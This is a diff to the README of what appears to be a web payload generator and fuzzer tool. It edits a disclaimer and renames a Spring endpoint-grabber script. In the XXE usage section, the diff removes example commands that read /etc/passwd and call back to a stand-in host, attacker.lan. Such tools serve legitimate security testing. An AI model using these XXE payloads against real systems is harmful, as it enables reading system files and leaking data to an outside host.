@@ -4,7 +4,7 @@ Web payloads generator and fuzzer helper
 
 ## Disclaimer
 
-Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end user’s responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.
+Usage of all tools on this site for attacking targets without prior mutual consent is illegal. It is the end userï¿½s responsibility to obey all applicable local, state and federal laws. We assume no liability and are not responsible for any misuse or damage caused by this site. This tools is provided "as is" without warranty of any kind.
 
 ## References
 
@@ -101,9 +101,9 @@ gc wordlist.txt |%{ .\CShidori.exe mut 5 "$_" }
 ### XXE
 
 ```powershell
-.\CShidori.exe xxe file /etc/passwd
-.\CShidori.exe xxe call http://attacker.lan
-.\CShidori.exe xxe all http://attacker.lan
+.\CShidori.exe xxe file
+.\CShidori.exe xxe call 
+.\CShidori.exe xxe all
 ```
 
 ### Mutation
@@ -120,9 +120,9 @@ gc wordlist.txt |%{ .\CShidori.exe mut 5 "$_" }
 
 ## Miscellaneous scripts
 
-### Spring-parser.ps1
+### CShidori-Spring.ps1
 
-endpoints, parameters and wsdl grabber from Spring projects
+Security hotspots, endpoints, parameters and wsdl grabber from Spring projects
 
 ```powershell
 . .\Spring-parser.ps1
